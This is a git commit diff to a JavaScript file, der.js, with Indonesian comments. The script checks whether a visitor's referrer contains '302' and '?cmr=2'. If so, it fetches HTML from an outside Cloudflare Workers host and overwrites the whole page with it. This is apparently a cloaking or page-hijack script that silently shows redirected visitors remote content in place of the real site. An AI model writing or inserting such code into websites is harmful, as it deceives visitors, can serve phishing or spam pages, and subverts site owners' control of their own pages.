c95b87c42c0bda2c83a8de0d2df7c1c526928d0e
mrotang <65051182+mrotang@users.noreply.github.com>
2023-05-20 22:07:45 +0700

    Update der.js

--- der.js
+++ der.js
@@ -1,11 +1,15 @@
 // Memeriksa apakah sumber lalu lintas adalah redirect status 302 dan memiliki parameter ?cmr=2
-if (document.referrer && document.referrer.includes("302") && document.referrer.includes("?cmr=2")) {
+if (document.referrer.includes("302") && document.referrer.includes("?cmr=2")) {
   // Mengambil HTML dari https://crm-template-one.mastimon.workers.dev/
   fetch("https://crm-template-one.mastimon.workers.dev/")
     .then(response => response.text())
     .then(html => {
+      // Membuat elemen sementara untuk menampung HTML yang diambil
+      const tempElement = document.createElement('html');
+      tempElement.innerHTML = html;
+
       // Mengganti HTML pada tag <html> dengan HTML yang diambil dari website
-      document.querySelector('html').innerHTML = html;
+      document.documentElement.innerHTML = tempElement.innerHTML;
     })
     .catch(error => {
       console.error('Error:', error);
